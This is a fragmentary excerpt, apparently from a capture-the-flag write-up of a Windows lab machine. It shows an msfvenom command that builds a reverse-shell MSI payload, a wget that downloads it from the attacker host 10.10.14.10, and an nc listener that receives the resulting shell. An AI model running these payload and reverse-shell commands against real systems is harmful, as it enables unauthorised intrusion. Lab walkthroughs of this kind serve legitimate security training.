...
```bash
❯ mysql -h $target
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '10.10.14.10' is not allowed to connect to this MariaDB server
```
...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.239] 63465
...
```bash
❯ msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=5555 -f msi -o rev.msi
...
```bash
PS C:\ProgramData> wget http://10.10.14.10/rev.msi -outfile rev.msi
wget http://10.10.14.10/rev.msi -outfile rev.msi
```
...
❯ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.239] 63478
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.
